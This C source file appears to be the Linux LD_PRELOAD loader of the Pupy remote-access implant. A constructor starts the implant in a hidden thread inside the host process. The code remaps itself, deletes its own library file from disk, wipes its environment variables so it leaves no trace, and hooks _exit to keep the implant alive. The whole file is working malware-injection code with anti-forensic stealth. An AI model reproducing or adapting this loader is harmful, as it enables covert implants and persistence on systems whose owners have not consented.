#define _GNU_SOURCE
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>

#include <dlfcn.h>

#include "pupy_load.h"
#include "tmplibrary.h"
#include "debug.h"

static pthread_t thread_id;

static int __argc = 0;
static char ** __argv = NULL;
static int __to_wait = 0;

static void *
thread_start(void *arg) {
    mainThread(__argc, __argv, true);
    return NULL;
}

static
void unloader(void) {
    dprint("Wait until pupy thread exits\n");
    pthread_join(thread_id, NULL);
    dprint("Sutting down\n");
}

void _exit(int status) {
    dprint("Catch exit (%d)\n", __to_wait);
    __attribute__((noreturn))
        void (*orig_exit)(int status) = dlsym(RTLD_NEXT, "_exit");

    if (__to_wait) {
        dprint("Hook exit\n");
        unloader();
    }

    orig_exit(status);
}

static
void __atexit() {
    dprint("At exit\n");
    _exit(0);
}

static
void __on_exit(int status, void *data) {
    dprint("On exit\n");
    _exit(status);
}


static void _fill_argv(int argc, char* argv[], char* envp[]) {
    dprint("fill_argv called: %d/%p/%p\n", argc, argv, envp);
#ifdef DEBUG
    int i;
    for (i=0; i<argc; i++) {
        dprint("ARGV[%d] = %s\n", i, argv[i]);
    }
#endif

    __argc = argc;
    __argv = argv;

    while (*envp) {
        if ((strncmp(*envp, "LD_PRELOAD=", 11) == 0)
            || strncmp(*envp, "CLEANUP=", 8) == 0
            || strncmp(*envp, "HOOK_EXIT=", 10) == 0) {
            dprint("CLEAN %s\n", *envp);
            memset(*envp, 0, strlen(*envp));
        }
        envp++;
    }
}

__attribute__((section(".init_array"))) void (* pfill_argv)(int, char*[], char*[]) = _fill_argv;

__attribute__((constructor))
void loader() {
    pthread_attr_t attr;
    pthread_attr_init(&attr);

    char *ldpreload = getenv("LD_PRELOAD");
    char *cleanup = getenv("CLEANUP");
    char *hook_exit = getenv("HOOK_EXIT");

    if (hook_exit && strncmp(hook_exit, "1", 1) == 0)
        __to_wait = 1;

    if (ldpreload) {
        dprint("REMAP SELF\n0");
        remap(ldpreload);
    }

    if (cleanup && ldpreload && !strcmp(cleanup, "1")) {
        dprint("Cleanup requested. Cleanup %s\n", ldpreload);
        unlink(ldpreload);
    }

    if (ldpreload) {
        dprint("Unset LD_PRELOAD (%s)\n", ldpreload);
        unsetenv("LD_PRELOAD");
    }

    atexit(__atexit);
    on_exit(__on_exit, NULL);

    dprint("Start thread (LDPRELOAD=%s/%d)\n", ldpreload, __to_wait);
    pthread_create(
        &thread_id, &attr,
        thread_start, NULL
    );
}
